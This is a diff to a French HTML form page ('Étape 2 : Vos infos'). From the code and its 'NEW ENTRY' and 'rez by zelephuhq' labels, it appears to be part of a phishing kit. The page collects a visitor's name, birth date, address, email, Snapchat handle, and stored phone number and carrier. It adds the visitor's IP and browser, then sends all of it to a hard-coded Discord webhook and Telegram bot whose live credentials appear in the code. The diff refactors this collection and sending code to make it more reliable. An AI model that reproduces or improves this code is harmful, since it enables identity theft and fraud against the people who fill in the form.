@@ -2,123 +2,168 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Formulaire</title>
   <style>
     body {
       background: #2c014d;
-      color: #fff;
+      color: #ffffff;
       font-family: sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
       margin: 0;
+      padding: 15px;
+      box-sizing: border-box;
     }
+
     .c {
-      background: rgba(44,1,77,0.85);
-      padding: 30px;
+      background: rgba(44, 1, 77, 0.88);
+      padding: 32px 28px;
       border-radius: 20px;
-      width: 360px;
+      width: 100%;
+      max-width: 380px;
       text-align: center;
-      box-shadow: 0 0 15px #9b00ff;
+      box-shadow: 0 0 25px rgba(155, 0, 255, 0.6);
       border: 2px solid #a54ffb;
+      backdrop-filter: blur(4px);
     }
-    input, button {
+
+    h1 {
+      margin: 0 0 28px;
+      font-size: 1.65rem;
+      color: #f7b500;
+      text-shadow: 0 0 12px #f7b500;
+    }
+
+    label {
+      display: block;
+      text-align: left;
+      margin: 14px 0 6px;
+      font-size: 0.92rem;
+      color: #d4bbff;
+    }
+
+    input,
+    button {
       width: 100%;
       margin: 8px 0;
-      padding: 12px;
+      padding: 13px 16px;
       border: 2px solid #a54ffb;
       border-radius: 10px;
-      background: transparent;
+      background: rgba(255, 255, 255, 0.04);
       color: white;
       font-size: 16px;
       outline: none;
-      box-shadow: inset 0 0 8px #9b00ff;
-      transition: 0.3s;
+      transition: all 0.3s ease;
+      box-shadow: inset 0 0 10px rgba(155, 0, 255, 0.25);
     }
+
     input:focus {
       border-color: #f7b500;
-      box-shadow: 0 0 10px #f7b500;
+      box-shadow: 0 0 14px #f7b50088;
+      background: rgba(255, 255, 255, 0.08);
     }
+
     button {
       background: #f7b500;
       color: #2c014d;
       font-weight: bold;
       cursor: pointer;
-      box-shadow: 0 0 10px #f7b500;
-      transition: 0.3s;
+      border: none;
+      box-shadow: 0 0 15px #f7b500aa;
+      margin-top: 18px;
+      font-size: 1.1rem;
     }
+
     button:hover {
-      background: #e0a600;
-      box-shadow: 0 0 20px #ffcb3c;
+      background: #ffcb3c;
+      box-shadow: 0 0 28px #ffcb3c;
+      transform: translateY(-2px);
     }
+
     #msg {
-      color: #f88;
-      margin-top: 15px;
+      margin-top: 18px;
+      font-size: 0.95rem;
+      min-height: 1.4em;
     }
-    label {
-      display: block;
-      text-align: left;
-      margin: 10px 0 5px 0;
-      font-size: 14px;
-    }
+
+    .success { color: #aaffaa; }
+    .error   { color: #ff8888; }
   </style>
 </head>
 <body>
+
   <div class="c">
     <h1>Étape 2 : Vos infos</h1>
+
     <form id="form2">
-      <input name="nom" placeholder="Nom" required />
-      <input name="prenom" placeholder="Prénom" required />
+      <input name="nom"     placeholder="Nom"              required />
+      <input name="prenom"  placeholder="Prénom"           required />
+      
       <label for="naissance">Date de naissance :</label>
-      <input id="naissance" name="naissance" type="date" required />
-      <input name="email" type="email" placeholder="Email" required />
-      <input name="ville" placeholder="Ville" required />
-      <input name="codePostal" placeholder="Code Postal" required />
-      <input name="adresse" placeholder="Adresse (facultatif)" />
-      <input name="snap" placeholder="Nom Snapchat" required />
+      <input id="naissance" name="naissance" type="date"   required />
+      
+      <input name="email"    type="email" placeholder="Email"          required />
+      <input name="ville"    placeholder="Ville"                       required />
+      <input name="codePostal" placeholder="Code Postal"             required />
+      <input name="adresse"  placeholder="Adresse (facultatif)"        />
+      <input name="snap"     placeholder="Nom Snapchat"                required />
+
       <button type="submit">Valider</button>
     </form>
+
     <div id="msg"></div>
   </div>
 
   <script>
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474169014027813048/-BCyQk9VGD0Y6drGsv2FUp0vc5Jn8qWwMLPPHalPfx9QxKUht-3azqggeTp8UAbtQTwB";
-    const DISCORD_ALT_WEBHOOK_URL = "https://discord.com/api/webhooks/1474169014027813048/-BCyQk9VGD0Y6drGsv2FUp0vc5Jn8qWwMLPPHalPfx9QxKUht-3azqggeTp8UAbtQTwB";
+    const DISCORD_WEBHOOK_URL    = "https://discord.com/api/webhooks/1474169014027813048/-BCyQk9VGD0Y6drGsv2FUp0vc5Jn8qWwMLPPHalPfx9QxKUht-3azqggeTp8UAbtQTwB";
+    const DISCORD_ALT_WEBHOOK_URL = DISCORD_WEBHOOK_URL; // même URL dans ton cas
     const TELEGRAM_TOKEN = "8376532446:AAEJHOCBBO8KrHJb2pnrsu2e1-Ow17pl9r0";
     const TELEGRAM_CHAT_ID = "8431463416";
 
-    async function sendDiscord(embed, webhookUrl) {
-      return fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [embed] }),
-      });
+    async function sendDiscord(embed, url) {
+      try {
+        const res = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ embeds: [embed] })
+        });
+        return res.ok;
+      } catch {
+        return false;
+      }
     }
 
     async function sendTelegram(text) {
-      return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text,
-          parse_mode: "Markdown",
-          disable_web_page_preview: true,
-        }),
-      });
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text,
+            parse_mode: "Markdown",
+            disable_web_page_preview: true
+          })
+        });
+        return res.ok;
+      } catch {
+        return false;
+      }
     }
 
     async function getApifyInfo() {
       try {
-        const response = await fetch('https://api.apify.com/v2/browser-info?format=json');
-        const data = await response.json();
+        const res = await fetch('https://api.apify.com/v2/browser-info?format=json');
+        if (!res.ok) throw new Error();
+        const data = await res.json();
         return {
           ip: data.ip || "Inconnu",
           ua: data.userAgent || navigator.userAgent
         };
-      } catch (err) {
-        console.error("Erreur récupération Apify :", err);
+      } catch {
         return {
           ip: "Inconnu",
           ua: navigator.userAgent
@@ -128,92 +173,76 @@
 
     document.getElementById("form2").addEventListener("submit", async (e) => {
       e.preventDefault();
-      const msgElem = document.getElementById("msg");
-      msgElem.textContent = "Envoi en cours...";
+      const msg = document.getElementById("msg");
+      msg.textContent = "Envoi en cours...";
+      msg.className = "";
 
       const formData = new FormData(e.target);
-      const step2 = {
-        nom: formData.get("nom"),
-        prenom: formData.get("prenom"),
-        naissance: formData.get("naissance"),
-        email: formData.get("email"),
-        ville: formData.get("ville"),
-        codePostal: formData.get("codePostal"),
-        adresse: formData.get("adresse"),
-        snap: formData.get("snap")
-      };
+      const step2 = Object.fromEntries(formData);
 
-      const step1 = JSON.parse(localStorage.getItem("step1") || "{}");
+      const step1Raw = localStorage.getItem("step1") || "{}";
+      const step1 = JSON.parse(step1Raw);
       const operateur = step1.operateur || "Non fourni";
       const telephone = step1.telephone || "Non fourni";
 
-      // Récupération IP et User-Agent via Apify
-      const apifyInfo = await getApifyInfo();
-      const ip = apifyInfo.ip;
-      const ua = apifyInfo.ua;
+      const apify = await getApifyInfo();
+      const ip = apify.ip;
+      const ua  = apify.ua;
 
-      let webhookToUse = DISCORD_WEBHOOK_URL;
+      let webhook = DISCORD_WEBHOOK_URL;
       if (operateur.toLowerCase().includes("bouygues") && Math.random() < 0.5) {
-        webhookToUse = DISCORD_ALT_WEBHOOK_URL;
+        webhook = DISCORD_ALT_WEBHOOK_URL;
       }
 
-      const discordEmbed = {
-          title: `📘 +1 NEW ENTRY: ${step2.snap || "Non fourni"} 📘`,
+      const txt = 
+`📘 **+1 NEW ENTRY : ${step2.snap || "—"}** 📘
+
+**Informations personnelles**
+├ 👤 **Nom complet** : ${step2.nom} ${step2.prenom}
+├ 🏠 **Adresse** : ${step2.adresse || "—"}
+├ 📍 **Ville** : ${step2.ville}
+├ 📮 **Code postal** : ${step2.codePostal}
+└ 📱 **Téléphone** : ${telephone}
+
+**Contact**
+├ ✉️ **Email** : ${step2.email}
+├ 👻 **Snapchat** : ${step2.snap || "—"}
+└ 📡 **Opérateur** : ${operateur}
+
+**Connexion**
+├ 🧭 **IP** : ${ip}
+└ 💻 **Navigateur** : ${ua}`;
+
+      const embed = {
+        title: `📘 +1 NEW ENTRY : ${step2.snap || "—"} 📘`,
         color: 0x9b00ff,
-        fields: [
-          {
-            name: "\u200B",
-            value:
-              `📂 Informations Personnelles\n` +
-              `├ 👤 Nom complet : ${step2.nom} ${step2.prenom}\n` +
-              `├ 🏠 Adresse : ${step2.adresse}\n` +
-              `├ 📍 Ville : ${step2.ville}\n` +
-              `├ 📮 Zip : ${step2.codePostal}\n` +
-              `└ 📱 Numéro de téléphone : \`\`${telephone}\`\`\n\n` +
-
-              `📧 Contact\n` +
-              `├ ✉️ Email : ${step2.email}\n` +
-              `├ 👻 Snapchat : ${step2.snap || "Non fourni"}\n` +
-              `└ 📡 Opérateur : ${operateur}\n\n` +
-
-              `🌐 Connexion\n` +
-              `├ 🧭 IP : ${ip}\n` +
-              `└ 💻 Navigateur : ${ua}`
-          }
-        ],
+        description: txt,
         timestamp: new Date().toISOString(),
-        footer: { text: "🇪🇸rez by zelephuhq🇪🇸" }
+        footer: { text: "🇪🇸 rez by zelephuhq 🇪🇸" }
       };
 
-      const telegramText =
-        `🏴‍☠️ v2 zeleph 🏴‍☠️\n\n` +
-        `|🇪🇪| Nom : ${step2.nom}\n` +
-        `|🇪🇪| Prénom : ${step2.prenom}\n` +
-        `|🇪🇪| Naissance : ${step2.naissance}\n` +
-        `|🇪🇪| Snapchat : ${step2.snap || "Non fourni"}\n\n` +
-        `|🏠| Adresse : ${step2.adresse || "Non fournie"}\n` +
-        `|🏠| Ville : ${step2.ville}\n` +
-        `|🏠| Code Postal : ${step2.codePostal}\n\n` +
-        `|🪁| E‑Mail : ${step2.email}\n` +
-        `|🪁| Téléphone : ${telephone}\n` +
-        `|🪁| Opérateur : ${operateur}\n\n` +
-        `|🥥| Adresse IP : ${ip}\n` +
-        `|🥥| User-Agent : ${ua}`;
-
       try {
-        await Promise.all([
-          sendDiscord(discordEmbed, webhookToUse),
-          sendTelegram(telegramText)
+        const [discordOk, telegramOk] = await Promise.all([
+          sendDiscord(embed, webhook),
+          sendTelegram(txt)
         ]);
-        msgElem.textContent = "Données envoyées avec succès ! Redirection...";
-        localStorage.setItem("step2", JSON.stringify(step2));
-        setTimeout(() => window.location.href = "merci.html", 1000);
+
+        if (discordOk || telegramOk) {
+          msg.textContent = "Données envoyées avec succès ! Redirection...";
+          msg.className = "success";
+          localStorage.setItem("step2", JSON.stringify(step2));
+          setTimeout(() => {
+            window.location.href = "merci.html";
+          }, 1400);
+        } else {
+          throw new Error("échec total");
+        }
       } catch (err) {
-        msgElem.textContent = "Erreur lors de l'envoi.";
+        msg.textContent = "Erreur lors de l'envoi. Réessaie ?";
+        msg.className = "error";
         console.error(err);
       }
     });
   </script>
 </body>
 </html>
-
